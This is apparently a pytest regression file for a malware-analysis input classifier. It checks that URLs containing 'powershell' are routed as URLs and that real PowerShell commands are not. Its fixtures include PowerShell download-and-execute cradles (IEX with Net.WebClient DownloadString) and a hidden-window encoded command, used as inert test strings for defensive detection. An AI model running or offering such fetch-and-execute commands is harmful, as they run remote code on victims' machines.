"""Regression lock · 2026-02-09

Bug: A bare URL whose path contains the substring "powershell" (e.g. a
Sophos blog article ending in "…/decoding-malicious-powershell") was
misclassified as `powershell_naked` and routed to the PowerShell AST
engine instead of the URL acquisition pipeline.  Reproduced from a real
user-reported case ("Saved case: Main — wrong output again and again").

Root cause: the `\\bpowershell\\b` regex in `services.die.input_understanding.classify()`
matched the URL path BEFORE the URL-only check further down.

Fix: URL-only check now runs before the PowerShell-naked heuristic.
This module locks the fix so it cannot silently regress.
"""
from __future__ import annotations

import pytest

from services.die.input_understanding import classify


URL_CASES_THAT_MUST_BE_URL_ONLY = [
    # The exact bug report URL
    "https://community.sophos.com/sophos-labs/b/blog/posts/decoding-malicious-powershell",
    # Same host family, variations
    "https://community.sophos.com/some/path/PowerShell-tutorial",
    "https://community.sophos.com/PWSH-detection-guide",
    # Trailing whitespace / newline (real paste scenarios)
    "https://community.sophos.com/x/powershell\n",
    "  https://community.sophos.com/y/pwsh.exe  ",
    # Any vendor URL with the trigger substring
    "http://blog.talosintelligence.com/2024/powershell-loader",
    "https://securelist.com/malicious-powershell-analysis/",
    "https://www.mandiant.com/resources/blog/powershell-abuse",
    # URLs with the actual interpreter name in the path
    "https://example.com/downloads/pwsh.exe",
    "https://example.com/tools/powershell.exe/manual",
]


@pytest.mark.parametrize("url", URL_CASES_THAT_MUST_BE_URL_ONLY)
def test_bare_url_is_never_classified_as_powershell(url: str) -> None:
    """A single URL — regardless of path content — must classify as `url_only`."""
    input_type, label, confidence, reasoning = classify(url)
    assert input_type == "url_only", (
        f"URL {url!r} was misclassified as {input_type!r} "
        f"(label={label!r}); expected url_only. "
        "The `\\bpowershell\\b` regex must not win over the URL-only check."
    )
    assert label == "URL"
    assert confidence >= 0.9
    assert any("bare URL" in r.lower() or "url" in r.lower() for r in reasoning)


def test_powershell_script_still_classifies_as_powershell_naked() -> None:
    """Guard against over-correction: real PowerShell scripts must still work."""
    script = "IEX(New-Object Net.WebClient).DownloadString('http://x')"
    input_type, _, _, _ = classify(script)
    assert input_type == "powershell_naked"


def test_powershell_exe_command_still_classifies_as_powershell_naked() -> None:
    """A raw powershell.exe invocation is not a URL — must remain PowerShell."""
    cmd = "powershell.exe -NoP -W Hidden -EncodedCommand SGVsbG8="
    input_type, _, _, _ = classify(cmd)
    # This one may match `powershell_encoded` first (due to -EncodedCommand).
    # Either powershell variant is acceptable — the important thing is it's
    # NOT `url_only`.
    assert input_type in ("powershell_encoded", "powershell_naked")


def test_multiline_input_with_url_and_powershell_stays_powershell() -> None:
    """A URL embedded inside a multi-line PowerShell script must still route to PowerShell."""
    script = (
        "powershell.exe -NoP -W Hidden\n"
        "IEX(New-Object Net.WebClient).DownloadString('https://community.sophos.com/x/powershell')\n"
        "Invoke-Expression $payload\n"
    )
    input_type, _, _, _ = classify(script)
    # Multi-line with `powershell` in payload should NOT collapse to url_only
    assert input_type != "url_only"
